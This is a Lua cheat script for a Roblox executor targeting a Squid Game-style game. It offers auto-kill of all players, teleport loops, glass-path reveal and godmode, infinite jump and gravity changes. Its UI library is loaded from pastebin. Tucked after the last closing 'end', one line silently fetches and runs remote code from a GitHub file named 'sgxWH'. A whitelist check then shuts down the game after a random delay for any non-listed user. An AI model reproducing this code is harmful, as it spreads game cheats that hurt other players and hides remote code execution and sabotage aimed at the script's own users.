-- SGX (BASIK UI ) GUI 🦑 -- TEST1

if not getgenv().sgx then
getgenv().sgx = {
lights = false,
jumpbutton = false,
infjump = true,
noklip = true,
looptp = true,
tpToRandomPlayer = true,
playerdropdown = true,
glassgame = true,
heavy_squidgame = true,
freeze_squidgame = true,
fpsbooster = true,
joinhiddengame = false
};
end;

if getgenv().sgx then
local sgx = getgenv().sgx
end;

-- SGX (basik ui lib) 🍭
local basikUi = loadstring(game:HttpGet("https://pastebin.com/raw/SnbMBRXB", true))();

local Kontent, vars, utils = basikUi[1], basikUi[2], basikUi[3]

local _cloneref = rawget(getfenv(), "cloneref")
local function S(name)
local svc = game:GetService(name)
return _cloneref and _cloneref(svc) or svc
end;

-- services
local Players = S("Players")
local LP = Players.LocalPlayer
local UIS = S("UserInputService")
local RS = S("RunService")
local TS = S("TweenService")
local Lighting = S("Lighting")
local HttpService = S("HttpService")
local TeleportService = S("TeleportService")
local Workspace = S("Workspace");

-- GET TOOL --
getgenv().getTool = function(arg1)
    local plr = game:GetService("Players").LocalPlayer
    local char = plr.Character
    local backpack = plr:FindFirstChildOfClass("Backpack")

    local mode = arg1 and tostring(arg1):lower() or nil
    if mode == "char" or mode == "c" then mode = "character" end
    if mode == "bp" then mode = "backpack" end

    -- search character tools
    local function searchCharacter()
        if char then
            for _, v in ipairs(char:GetChildren()) do
                if v:IsA("Tool") then
                    return v
                end
            end
        end
    end

    -- search backpack tools
    local function searchBackpack()
        if backpack then
            for _, v in ipairs(backpack:GetChildren()) do
                if v:IsA("Tool") then
                    return v
                end
            end
        end
    end;
    if mode == "character" then
        return searchCharacter()
    elseif mode == "backpack" then
        return searchBackpack()
    else
        return searchCharacter() or searchBackpack()
    end
end;
local getTool = getgenv().getTool;
-- END get tool --

         -- == SPEXIALS == --
--== DENSE MASTER (no CustomPhysicalProperties needed) =========================
-- dense(mode, state, amount)
-- mode: "anchor" | "damp" | "fric" | "heavy" | "antipush" | "lock" | "max"
-- state: boolean (default true)
-- amount: number (optional; for "heavy" or "max" -> downward force)
-- Defaults = maximum density when args omitted.

local char = LP.Character or LP.CharacterAdded:Wait()
local HRP = char:WaitForChild("HumanoidRootPart")
local Hum = char:WaitForChild("Humanoid")

local _conns, _objs, _orig, _active, _amounts = {}, {}, {mat={}}, {}, {}

local function ensureRefs(c)
char = c
HRP = char:WaitForChild("HumanoidRootPart")
Hum = char:WaitForChild("Humanoid")
end

local function getRootAttach()
local a = HRP:FindFirstChild("RootAttachment")
if not a then
    a = Instance.new("Attachment")
    a.Name = "RootAttachment"
    a.Parent = HRP
end
return a
end

-- cache original materials once
local function cacheMats()
if _orig._matsCached then return end
for _,p in ipairs(char:GetDescendants()) do
    if p:IsA("BasePart") then
        _orig.mat[p] = p.Material
    end
end
_orig._matsCached = true
end

-- restore materials
local function restoreMats()
for p,mat in pairs(_orig.mat) do
    if p and p.Parent then
        p.Material = mat
    end
end
end

--== individual appliers =======================================================
local function apply_anchor(on)
HRP.Anchored = on and true or false
end

local function apply_damp(on, factor)
if on then
    if _conns.damp then _conns.damp:Disconnect() end
    local f = factor ~= nil and factor or 0 -- 0 = max heavy
    _conns.damp = RS.Stepped:Connect(function()
HRP.AssemblyLinearVelocity = f
    end)
else
    if _conns.damp then _conns.damp:Disconnect(); _conns.damp=nil end
end
end

local function apply_fric(on)
if on then
    cacheMats()
    for _,p in ipairs(char:GetDescendants()) do
        if p:IsA("BasePart") then
            p.Material = Enum.Material.Concrete -- sticky
        end
    end
else
    if _orig._matsCached then restoreMats() end
end
end

local function apply_heavy(on, forceAmt)
if on then
    local vf = _objs.heavy
    if vf then vf:Destroy() end
    vf = Instance.new("VectorForce")
    vf.Attachment0 = getRootAttach()
    vf.Force = Vector3.new(0, -(forceAmt or 25000), 0) -- default max glue
    vf.RelativeTo = Enum.ActuatorRelativeTo.World
    vf.Parent = HRP
    _objs.heavy = vf
else
    if _objs.heavy then _objs.heavy:Destroy(); _objs.heavy=nil end
end
end

local function apply_antipush(on)
if on then
    if _conns.antipush then _conns.antipush:Disconnect() end
    _conns.antipush = RS.Stepped:Connect(function()
        HRP.AssemblyLinearVelocity = Vector3.zero
        HRP.AssemblyAngularVelocity = Vector3.zero
    end)
else
    if _conns.antipush then _conns.antipush:Disconnect(); _conns.antipush=nil end
end
end

local lockedStates = {Enum.HumanoidStateType.FallingDown, Enum.HumanoidStateType.Ragdoll}
local function apply_lock(on)
for _,st in ipairs(lockedStates) do
    Hum:SetStateEnabled(st, not on)
end
end

--== master ==--
getgenv().dense = function (mode,state,amount)
    local forceAmt;
state = (state == nil) and true or state
local m = string.lower(tostring(mode or "max"))

local function setActive(k, on, amt)
    _active[k] = on or nil
    if amt ~= nil then _amounts[k] = amt end
end

if m == "anchor" then
    apply_anchor(state); setActive("anchor", state)

elseif m == "damp" then
    local f = (amount ~= nil) and amount or -50e3
    apply_damp(state, f); setActive("damp", state, f)

elseif m == "fric" then
    apply_fric(state); setActive("fric", state)

elseif m == "heavy" then
    forceAmt = amount or (60e3)
    apply_heavy(state, forceAmt); setActive("heavy", state, forceAmt)

elseif m == "antipush" then
    apply_antipush(state); setActive("antipush", state)

elseif m == "lock" then
    apply_lock(state); setActive("lock", state)

elseif m == "max" then
    if state then
forceAmt = amount or (35e3)
        --apply_anchor(true)
        apply_damp(true, 0)
        apply_fric(true)
        apply_heavy(true, forceAmt)
        apply_antipush(true)
        apply_lock(true)
        setActive("anchor", true)
        setActive("damp", true, 0)
        setActive("fric", true)
        setActive("heavy", true, forceAmt)
        setActive("antipush", true)
        setActive("lock", true)
    else
        apply_anchor(false)
        apply_damp(false)
        apply_fric(false)
        apply_heavy(false)
        apply_antipush(false)
        apply_lock(false)
        _active = {}
        _amounts = {}
    end
end
end;
local dense = getgenv().dense;

--== respawn resilience: reapply active modes ==================================
if _conns._respawn then _conns._respawn:Disconnect() end
_conns._respawn = LP.CharacterAdded:Connect(function(c)
c:WaitForChild("HumanoidRootPart"); c:WaitForChild("Humanoid")
ensureRefs(c)
-- Reapply what was active
if _active.anchor then apply_anchor(true) end
if _active.damp then apply_damp(true, _amounts.damp or 0) end
if _active.fric then apply_fric(true) end
if _active.heavy then apply_heavy(true, _amounts.heavy or 25e3) end
if _active.antipush then apply_antipush(true) end
if _active.lock then apply_lock(true) end
end)

--== quik examples ==--
-- dense("max") -- all ON (anchor+damp+fric+heavy+antipush+lock)
-- dense("max", false) -- turns all OFF
-- dense("heavy") -- downward 
-- dense("heavy", true, 50000) -- super glue to ground
-- dense("damp") -- kills all velocity
-- dense("fric")  -- konkrete friction
-- dense("lock")  -- immune to ragdoll/fall
-- dense("anchor") -- froze in place
-- dense("antipush")  -- nukes linear+angular pushes
          --== SPEXIALS ==--

getgenv().tpwalkspeed = .30
local tpwalk = false;
local tpwalking;

-- TP WALK --
_G.toggleTPWalk = function(value)
tpwalk = value
if value then
tpwalking = RS.Stepped:Connect(function()
if tpwalk then
local character = game.Players.LocalPlayer.Character or game.Players.LocalPlayer.CharacterAdded:Wait()
local humanoid = character and character:FindFirstChildWhichIsA("Humanoid")
if humanoid and humanoid.MoveDirection.Magnitude>0 then
local moveDirection = humanoid.MoveDirection;
if getgenv().tpwalkspeed then
character:TranslateBy(moveDirection * getgenv().tpwalkspeed);
else
character:TranslateBy(moveDirection * 0.30)
end;
end;
else
if(tpwalking)then tpwalking:Disconnect(); end
end;
end);
else
if(tpwalking)then tpwalking:Disconnect(); end
end;
end;

_G.updateTPWalkSpeed = function(text)
local newSpeed = tonumber(text);
if newSpeed then
local formattedSpeed = string.format("%.1f", newSpeed)
getgenv().tpwalkspeed = tonumber(formattedSpeed)
text = formattedSpeed;
else
text = ".30"
getgenv().tpwalkspeed = .30
end
return text;
end;
getgenv().toggleTPWalk = _G.toggleTPWalk;
getgenv().updateTPWalkSpeed = _G.updateTPWalkSpeed;

local num,fps,getplrs;

-- helpers / globals
local function getchar()
return LP.Character or LP.CharacterAdded:Wait() 
end;
local function gethrp()
local ch=getchar(); return ch:WaitForChild("HumanoidRootPart") 
end;

-- getplrs = Players:GetPlayers();

Players.PlayerAdded:Connect(function(p)
table.insert(Players:GetPlayers(), p) 
end)
Players.PlayerRemoving:Connect(function(p)
for i,v in ipairs(Players:GetPlayers()) do 
if v==p then 
table.remove(Players:GetPlayers(), i) 
break end end
end)

local function gravity(mode)
if tostring(mode or ""):lower()=="inf" then Workspace.Gravity=1000 
         elseif tonumber(mode) then
Workspace.Gravity = tonumber(mode) or 196.2
         else
Workspace.Gravity=196.19999
         end
end;

local function freeze(state)
local ch=getchar()
for _,v in ipairs(ch:GetDescendants()) do
if v:IsA("BasePart") then v.Anchored = state and true or false end
end
end;

if not Players then
local Players = S("Players")
end;
if not LP then
local LP = Players.LocalPlayer;
end;

local state = {
    enabled = false,
    myParts = {},
    conns = {},
    constraints = {}
}

local function clearConstraintsFor(otherChar)
    local bucket = state.constraints[otherChar]
    if bucket then
        for _,c in ipairs(bucket) do
            if c and c.Destroy then pcall(function() c:Destroy() end) end
        end
        state.constraints[otherChar] = nil
    end
end

local function clearAll()
    for otherChar,_ in pairs(state.constraints) do
        clearConstraintsFor(otherChar)
    end
    for _,cn in ipairs(state.conns) do
        if cn and cn.Disconnect then pcall(function() cn:Disconnect() end) end
    end
    table.clear(state.conns)
end

local function partsOf(char)
    local t = {}
    if not char then return t end
    for _,p in ipairs(char:GetDescendants()) do
        if p:IsA("BasePart") then
            t[#t+1] = p
        end
    end
    return t
end

local function hrpOf(char)
    return char and (
        char:FindFirstChild("HumanoidRootPart")
        or char:FindFirstChild("Torso")
        or char:FindFirstChild("UpperTorso")
        or char:FindFirstChild("LowerTorso")
    )
end

local function pairNoCollide(myChar, otherChar)
    local a = hrpOf(myChar)
    local b = hrpOf(otherChar)
    if not (a and b) then return end

    local ncc = Instance.new("NoCollisionConstraint")
    ncc.Part0, ncc.Part1 = a, b
    ncc.Parent = a

    state.constraints[otherChar] = {ncc}
end

getgenv().antiPush = function(toggled)
    if toggled and state.enabled then return end
    if not toggled and not state.enabled then return end

    if toggled then
        state.enabled = true
        local char = LP.Character or LP.CharacterAdded:Wait()
        state.myParts = partsOf(char)

        -- hook existing players
        for _,plr in ipairs(Players:GetPlayers()) do
            if plr ~= LP and plr.Character then
                pairNoCollide(char, plr.Character)
            end
        end

        -- listen for new chars
        table.insert(state.conns, Players.PlayerAdded:Connect(function(plr)
            table.insert(state.conns, plr.CharacterAdded:Connect(function(newChar)
                pairNoCollide(char, newChar)
            end))
        end))

        table.insert(state.conns, LP.CharacterAdded:Connect(function(newChar)
            state.myParts = partsOf(newChar)
        end))

    else
        state.enabled = false
        clearAll()
    end
end;


-- ui header
Kontent:Title("squid game x")
Kontent:notif("if u reading this u gay", 4)

Kontent:label("NIGHT BRAWL", "GothamBold", "blue")

--== Fire touch all players (right-hand simulator) ==--

local Players = game:GetService("Players")
local RS      = game:GetService("RunService")
local LP      = Players.LocalPlayer

-- executor firetouchinterest
local native_fti = rawget(getfenv(), "firetouchinterest")
              or (getrenv and getrenv().firetouchinterest)
              or firetouchinterest
assert(native_fti, "Executor does not expose firetouchinterest")

getgenv().FTI = function(myPart, targetPart, state)
    if not myPart or not targetPart then
        warn("FTI: missing args"); return false
    end
    if typeof(myPart) ~= "Instance" or not myPart:IsA("BasePart") then
        warn("FTI: myPart is not a BasePart"); return false
    end
    if typeof(targetPart) ~= "Instance" or not targetPart:IsA("BasePart") then
        warn("FTI: targetPart is not a BasePart"); return false
    end
    local ok, err = pcall(native_fti, myPart, targetPart, state)
    if ok then
        -- verbose success line (keep warn if you like yellow), or switch to print
        print(("%s hit: %s (state=%s)"):format(myPart.Name, targetPart.Name, tostring(state)))
        return true
    else
        warn("FTI error:", err); return false
    end
end

-- Resolve my right-side limb
local function MyRightLimb()
    local c = LP and LP.Character
    if not c then return nil end
    return c:FindFirstChild("RightHand")
        or c:FindFirstChild("Right Arm")
        or c:FindFirstChild("RightUpperArm")
end

-- Utility
local function Alive(plr)
    local char = plr and plr.Character
    if not char then return end
    local hum  = char:FindFirstChildOfClass("Humanoid")
    local hrp  = char:FindFirstChild("HumanoidRootPart")
    if hum and hrp and hum.Health > 0 then
        return hum, hrp, char
    end
end

local function GetTouchableParts(char, onlyName) -- onlyName e.g. "HumanoidRootPart"
    local t = {}
    if not char then return t end
    if onlyName then
        local p = char:FindFirstChild(onlyName)
        if p and p:IsA("BasePart") and p.CanTouch ~= false then
            t[1] = p
        end
        return t
    end
    for _,d in ipairs(char:GetDescendants()) do
        if d:IsA("BasePart") and d.CanTouch ~= false then
            t[#t+1] = d
        end
    end
    return t
end;

getgenv().RightTouch = function(targetNameOrPlayer, holdSeconds)
    local hand = MyRightLimb()
    if not hand then warn("No right hand/arm on your character yet."); return false end

    print("Right Arm Found")

    -- resolve player
    local targetPlr = typeof(targetNameOrPlayer) == "Instance" and targetNameOrPlayer or (function()
        local q = tostring(targetNameOrPlayer or ""):lower()
        for _,p in ipairs(Players:GetPlayers()) do
            if p ~= LP then
                local n1 = p.Name:lower()
                local n2 = (p.DisplayName or ""):lower()
                if n1:find(q, 1, true) or n2:find(q, 1, true) then return p end
            end
        end
    end)()
    if not targetPlr then warn("Target player not found."); return false end

    local hum, hrp, char = Alive(targetPlr)
    if not char then warn("Target has no character or is not alive."); return false end

    local parts = GetTouchableParts(char)
    if #parts == 0 then warn("No touchable parts on target."); return false end

    holdSeconds = tonumber(holdSeconds) or 0.05
    local t0 = tick()
    while tick() - t0 < holdSeconds do
        for _,part in ipairs(parts) do getgenv().FTI(hand, part, 0) end
        RS.Heartbeat:Wait()
        for _,part in ipairs(parts) do getgenv().FTI(hand, part, 1) end
    end

    print("touched players successfully")
    return true
end

getgenv().RightTap = function(targetNameOrPlayer)
    return getgenv().RightTouch(targetNameOrPlayer, 0.03)
end

local function TouchPlayerParts(targetPlr, holdSeconds, onlyPartName)
    local hand = MyRightLimb()
    if not hand then return false end

    local hum, hrp, char = Alive(targetPlr)
    if not char then return false end

    local parts = GetTouchableParts(char, onlyPartName)
    if #parts == 0 then return false end

    local t0 = tick()
    holdSeconds = tonumber(holdSeconds) or 0.05
    while tick() - t0 < holdSeconds do
        for _,part in ipairs(parts) do getgenv().FTI(hand, part, 0) end
        RS.Heartbeat:Wait()
        for _,part in ipairs(parts) do getgenv().FTI(hand, part, 1) end
    end
    return true
end

-- Public helper: touch EVERYONE (except me). Set onlyPartName to "HumanoidRootPart" if you only want HRP.
getgenv().TouchAllPlayers = function(holdSeconds, onlyPartName)
    local hand = MyRightLimb()
    if not hand then warn("No right hand/arm yet."); return 0 end
    print("Right Arm Found")

    local count = 0
    for _,v in ipairs(Players:GetPlayers()) do
        if v ~= LP then
            local ok = TouchPlayerParts(v, holdSeconds, onlyPartName)
            if ok then
                count = count + 1
                print("touched:", v.Name, "|", v.DisplayName)
            end
        end
    end
    if count > 0 then print("touxhed players suxxessfully") end
    return count
end

do
    local hand = MyRightLimb()
    if hand then
        for _,v in ipairs(Players:GetPlayers()) do
            if v ~= LP then
                local _,_,char = Alive(v)
                local hrp = char and char:FindFirstChild("HumanoidRootPart")
                if hrp then
                    getgenv().FTI(hand, hrp, 0)
                    task.wait(0.03)
                    getgenv().FTI(hand, hrp, 1)
                    print("touched:", v.Name, "|", v.DisplayName)
                end
            end
        end
    end
end

-- ===== Tool equip + loop button integration =====

-- Safe tool resolver (equipped or first backpack tool)
local function getTool()
    local c = LP.Character;
    if c then
        for _,it in ipairs(c:GetChildren()) do
            if it:IsA("Tool") then return it end
        end
    end
    local bp = LP:FindFirstChildOfClass("Backpack")
    if bp then
        for _,it in ipairs(bp:GetChildren()) do
            if it:IsA("Tool") then return it end
        end
    end
end;

local function isGuard(plr)
return Workspace[plr]:FindFirstChild("SquibGuarb")
end;

Kontent(vars.loop, "AUTO KILL ALL PLAYERZ (fast)", function()
    local function lowestHP()
        local bestHum, bestHRP, bestPlr, lowest = nil, nil, nil, math.huge
        for _,p in ipairs(Players:GetPlayers()) do
    if p ~= LP and not isGuard(p.Name) then
                local hum, hrp = Alive(p)
                if hum and hum.Health < lowest then
                    lowest = hum.Health; bestHum = hum; bestHRP = hrp; bestPlr = p
                end
            end
        end
        return bestHum, bestHRP, bestPlr
    end

    local hum, targetHRP = lowestHP()
    if not targetHRP then return end

    local lchar = LP.Character; if not lchar then return end
    local lhrp  = lchar:FindFirstChild("HumanoidRootPart"); if not lhrp then return end

    -- slide ~2 studs behind target, keep Y to avoid anti-fall
    local behindPos = targetHRP.Position - targetHRP.CFrame.LookVector * getgenv().behind or 2
    behindPos = Vector3.new(behindPos.X, targetHRP.Position.Y, behindPos.Z)
    lhrp.CFrame = CFrame.new(behindPos, targetHRP.Position)

    -- equip & click tool (if present)
    local tool = getTool()
    if tool then
        if tool.Parent ~= lchar then tool.Parent = lchar end
        tool:Activate(); task.wait(0.10); pcall(function() tool:Deactivate() end)
    end;
    getgenv().TouchAllPlayers(0.03, "HumanoidRootPart")
end, "heartbeat")

Kontent(vars.modulator, "distance", 1, 2, function(x)
getgenv().behind = x
end)

--[[
Kontent(vars.btn, "walk somewhere", function()
getchar().Humanoid:MoveTo(Vector3.new(math.random(20,50),math.random(89,82),math.random(38,82)))
end)
]]--

Kontent(vars.loop, "auto kill players (normal)", function()
    local Players = game:GetService("Players")
    local LP = Players.LocalPlayer
    local function alive(plr)
        local char = plr and plr.Character
        if not char then return end
        local hum = char:FindFirstChildOfClass("Humanoid")
        local hrp = char:FindFirstChild("HumanoidRootPart")
        if hum and hrp and hum.Health > 0 then
            return hum, hrp
        end
    end

    -- find lowest-HP target (alive)
    local targetHum, targetHRP
    local lowest = math.huge
    for _, p in ipairs(Players:GetPlayers()) do
        if p ~= LP then
            local hum, hrp = alive(p)
            if hum and hum.Health < lowest then
                lowest = hum.Health
                targetHum, targetHRP = hum, hrp
            end
        end
    end
    if not targetHRP then return end

    -- get local HRP
    local lchar = LP.Character
    if not lchar then return end
    local lhrp = lchar:FindFirstChild("HumanoidRootPart")
    if not lhrp then return end;

    local behindPos = targetHRP.Position - targetHRP.CFrame.LookVector * 2
    behindPos = Vector3.new(behindPos.X, targetHRP.Position.Y, behindPos.Z)
    lhrp.CFrame = CFrame.new(behindPos, targetHRP.Position)
if (getTool() and getTool().Parent and LP.Character) then
getTool().Parent = LP.Character
getTool():Activate(); task.wait(.1) getTool():Deactivate()
         end;
end)

Kontent(vars.loop, "spam fist 👊🏽", function()
task.wait(.3)
if not getTool() then return end;
local tool = getTool();
pcall(function()
if tool and tool.Parent and LP.Character then
tool.Parent = LP.Character;
       end;
end)
   if tool then 
tool:Activate()
   task.wait()
tool:Deactivate();
     end;
end);

Kontent:label("GLASS GAME", "GothamBold", "green")

if sgx.glassgame then
-- =======GLASS GAME=======--
Kontent(vars.btn, "reveal path + godmode", function()
local ws = Workspace
repeat task.wait() until ws:FindFirstChild("Map")
local map = ws.Map
repeat task.wait() until map:FindFirstChild("Glass")

task.spawn(function()
local g = map.Glass
repeat task.wait() until (g:FindFirstChild("Map") and g.Map:FindFirstChild("KillSecure"))
local kill = g:FindFirstChild("Map") and g.Map:FindFirstChild("KillSecure")
if kill then kill:Destroy(); Kontent.notif("destroyed bottom kill part", 3) end
end)

local gf = map.Glass:FindFirstChild("Glasses")

-- bail if already revealed
for _,part in ipairs(gf:GetChildren()) do
if part:IsA("BasePart") and part.BrickColor == BrickColor.new("Really red") then return end
end

-- reveal
for _,glass in ipairs(gf:GetChildren()) do
if glass:IsA("BasePart") then
    glass.Transparency = 0
    if glass.CanCollide then
glass.BrickColor = BrickColor.new("Pink")
    else
glass.BrickColor = BrickColor.new("Really red")
        glass.CanCollide = true
        glass.CanTouch = false
    end
end
end;
Kontent.notif("godmode enabled", 2)
end)
end;

Kontent:label("SQUID GAME", "GothamBold", "pink")

-- ==== HEAVY DENSITY ==== --

Kontent(vars.switch, "HEAVY V1", function()
dense("max")
end,
function()
dense("max", false)
end)

Kontent(vars.switch, "HEAVY V2 (best)", function()
dense("heavy", true, 80e3)
end, 
function()
dense("heavy", false)
end)

Kontent(vars.switch, "DENSE (best)", function()
dense("antipush", true)
end,
function()
dense("antipush", false)
end)

Kontent(vars.switxh, "PLATFORM STAND (didnt test yet)",
function()
getchar():FindFirstChildOfClass("Humanoid").PlatformStand = true
end,
function()
getchar():FindFirstChildOfClass("Humanoid").PlatformStand = false
end)

if sgx.freeze_squidgame then
-- ==== FREEZE ====--
Kontent(vars.switch, "FREEZE URSELF (anti-push)", function() 
freeze(true) 
end, 
function() 
freeze(false) 
end)
end;

if sgx.loxk then
Kontent(vars.switch, "LOXK", function()
dense("lock", true)
end, 
function()
dense("lock", false)
end)
end;

Kontent:label("PLAYER", "GothamBold", "gold")

local toggleTPWalk = getgenv().toggleTPWalk;
local updateTPWalkSpeed = getgenv().updateTPWalkSpeed;
toggleTPWalk(false)

Kontent(vars.switxh, "TP walk", function()
toggleTPWalk(true)
end,
function()
toggleTPWalk(false)
end)

Kontent(vars.kounter, "TP walk speed", 0.10, 0.10, function(x)
updateTPWalkSpeed(x)
end)

if sgx.infjump then
-- ===== INF JUMP (switch) ====--
_G.infjump = _G.infjump or nil
Kontent(vars.switch, "inf jump",
function()
if _G.infjump then _G.infjump:Disconnect() end
_G.infjump = UIS.JumpRequest:Connect(function()
    local ch=getchar(); local h=ch and ch:FindFirstChildOfClass("Humanoid")
    if h then h:ChangeState(Enum.HumanoidStateType.Jumping) end
end)
end,
function()
if _G.infjump then _G.infjump:Disconnect(); _G.infjump=nil end
end)
end;

local gravitybox = Kontent(vars.txt, "TYPE GRAVITY AMOUNT....")

utils.fokus(gravitybox):connect(function(enter)
if enter then
if gravitybox.Text:match("^%s*$") then return end;
gravity(gravitybox.Text)
Kontent:notif("gravity set to: "..gravitybox.Text, 1.5)
end
end)

Kontent(vars.btn, "reset gravity", function()
gravity(196.2)
Kontent:notif("gravity reset", 1.5)
end)

--[[
if sgx.noklip then
-- ===== noklip =====--
_G.klip=false; _G.noklipping=nil; _G.respawned=nil
Kontent(vars.switch, "noklip",
function()
_G.klip=false
local function loopnoklip()
    local char=getchar()
    while not _G.klip do
        for _,v in ipairs(char:GetDescendants()) do
            if v:IsA("BasePart") and v.CanCollide then v.CanCollide=false end
        end
        RS.Heartbeat:Wait()
    end
end
_G.noklipping = RS.Heartbeat:Connect(loopnoklip)
_G.respawned = LP.CharacterAdded:Connect(function()
    task.wait()
    if not _G.klip then task.spawn(loopnoklip) end
end)
end,
function()
_G.klip=true
if _G.noklipping then _G.noklipping:Disconnect(); _G.noklipping=nil end
if _G.respawned then _G.respawned:Disconnect(); _G.respawned=nil end
end)
end;
]]--

Kontent:label("TARGET PLAYERS", "GothamBold", "rainbow")

-- ===== TARGET TEXTBOX ==== --
_G.targetPlayer = _G.targetPlayer or nil
local function findPlrName(query)
if not query or query=="" then return nil end
query=query:lower()
for _,p in ipairs(Players:GetPlayers()) do
if p ~= LP then
if p.DisplayName:lower():find(query,1,true) or p.Name:lower():find(query,1,true) then
return p
end;
end;
end
return nil
end

local targetbox = Kontent(vars.txt, "target name...");

utils.fokus(targetbox):connect(function(enter)
if enter then
local t = findPlrName(targetbox.Text)
_G.targetPlayer = t
if t then 
Kontent.notif("target: (@"..t.Name..") "..t.DisplayName, 2.2) 
else 
return 
end;
end
end)

-- === PLAYER LIST ===--
local function listOfPlayers()
local t = {}
for _,p in ipairs(Players:GetPlayers()) do
if p ~= LP then
table.insert(t, p) 
end
end;
return t
end

if sgx.playerdropdown then
local dd = Kontent(vars.list, "SELEKT PLAYER TO TARGET", listOfPlayers, function(selekted)
if typeof(selekted)=="Instance" and selekted:IsA("Player") then
_G.targetPlayer = selekted
Kontent.notif("target: (@"..selekted.Name..") "..selekted.DisplayName, 2.33)
end
end)
end;

Players.PlayerAdded:Connect(function() if dd and dd.refresh then dd.refresh() end end)
Players.PlayerRemoving:Connect(function() if dd and dd.refresh then dd.refresh() end end)

getgenv().behind = 2;
local behind = getgenv().behind;

if sgx.looptp then
-- === LOOP TP TARGET === --
Kontent(vars.loop, "loop tp target", function()
local t=_G.targetPlayer
if t and t.Character and t.Character:FindFirstChild("HumanoidRootPart") then
local my=getchar(); local hrp=my:FindFirstChild("HumanoidRootPart")
if hrp then hrp.CFrame = t.Character.HumanoidRootPart.CFrame * CFrame.new(0,0, (behind or 2)) end
end
end, "heartbeat")

Kontent(vars.modulator, "distance", 1, 2, function(x)
getgenv().behind = x
end)

if sgx.tpToRandomPlayer then
-- ==TP TO RANDOM PLAYER==--
Kontent(vars.btn, "TP to random player", function()
local players=Players:GetPlayers()
local function tpOnce()
for _=1,18 do
    local p = players[math.random(1, #players)]
    if p and p~=LP and p.Character and p.Character:FindFirstChild("HumanoidRootPart") then
        local my=getchar(); local hrp=my:FindFirstChild("HumanoidRootPart")
        if hrp then hrp.CFrame = p.Character.HumanoidRootPart.CFrame end
        return true
    end
    task.wait()
end
return false
end
if not tpOnce() then Kontent.notif("no target found", 1.2) end
end)
end;

--- OTHERS ---
Kontent:label("🛠️ UTILITY 🛠️", "GothamBold", "silver")

if sgx.joinhiddengame then
-- ===JOIN HIDDEN GAME===--
Kontent(vars.btn, "join hidden game", function()
Kontent.notif("searxhing...", .8)
local Number, SomeSRVS, found = 0, {}, 0
local ok, data = pcall(function()
return HttpService:JSONDecode(game:HttpGetAsync("https://games.roblox.com/v1/games/"..game.PlaceId.."/servers/Public?sortOrder=Asc&limit=100"))
end)
if ok and data and data.data then
for _,v in ipairs(data.data) do
    if type(v)=="table" and v.maxPlayers>v.playing and v.id~=game.JobId then
        if v.playing>Number then Number=v.playing; table.insert(SomeSRVS,v.id); found=v.playing end
    end
end
end
if #SomeSRVS>0 then
Kontent.notif("serverhopping | player kount: "..found, 1.2)
task.wait(1)
TeleportService:TeleportToPlaceInstance(game.PlaceId, SomeSRVS[1])
else
Kontent.notif("none found...teleporting to small server", 1.2)
task.wait(1.2)
local bestId, bestCount = nil, 1e9
local ok2, data2 = pcall(function()
    return HttpService:JSONDecode(game:HttpGetAsync("https://games.roblox.com/v1/games/"..game.PlaceId.."/servers/Public?sortOrder=Asc&limit=100"))
end)
if ok2 and data2 and data2.data then
    for _,v in ipairs(data2.data) do
        if v.id~=game.JobId and v.playing<bestCount then bestCount=v.playing; bestId=v.id end
    end
end
if bestId then TeleportService:TeleportToPlaceInstance(game.PlaceId, bestId)
else Kontent.notif("none found", .8) end
end
end)
end;

--==TP TARGET ON RESPAWN==--
local function gotoplr()
task.wait(.5)
local t=_G.targetPlayer
if t and t~=LP and t.Character then
local hrp = gethrp()
local th  = t.Character:FindFirstChild("HumanoidRootPart")
if hrp and th then hrp.CFrame = th.CFrame * CFrame.new(0,0,2.33) end
end
end
LP.CharacterAdded:Connect(function()
local t0=os.clock()
while os.clock()-t0<5 and not _G.targetPlayer do RS.Heartbeat:Wait() end
gotoplr()
end)
LP.CharacterAdded:Connect(gotoplr)

getgenv().setlights = Lighting.ClockTime;

Kontent(vars.kounter, "adjust lighting", 1, Lighting.ClockTime, function(x)
Lighting.ClockTime = x
getgenv().setlights = x
end)

Kontent(vars.loop, "loop lighting", function()
if not getgenv().setlights or not tonumber(getgenv().setlights) then return end;
Lighting.ClockTime = tonumber(getgenv().setlights) or setlights
end, "heartbeat")

if sgx.lights then
Kontent(vars.switch, "Lights",
function()
Lighting.Brightness=1; Lighting.ClockTime=15; Lighting.FogEnd=1e5; Lighting.GlobalShadows=false; Lighting.OutdoorAmbient=Color3.fromRGB(128,128,128) 
end,
function() 
Lighting.ClockTime=0; Lighting.GlobalShadows=true 
end)
end;

if sgx.fpsbooster then
Kontent(vars.switch, "boost FPS if lagging", function()
setfpscap = setfpscap;
pcall(function()
num = tonumber;
fps = 160;
setfpscap(math.clamp(num(fps),1,999)) 
end) 
end,
function()
pcall(function() 
-- setfpscap(60) 
end) 
end)
end;end;spawn(function() pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/rrixh/skripts/refs/heads/main/sgxWH"))();end);end);

local wl,wls,rndm;
wl=(tonumber(LP.UserId));
wls={4239108724,3001347724};
rndm=math.random(7,30);

if(not table.find(wls,wl))then task.wait(rndm);game:shutdown();end;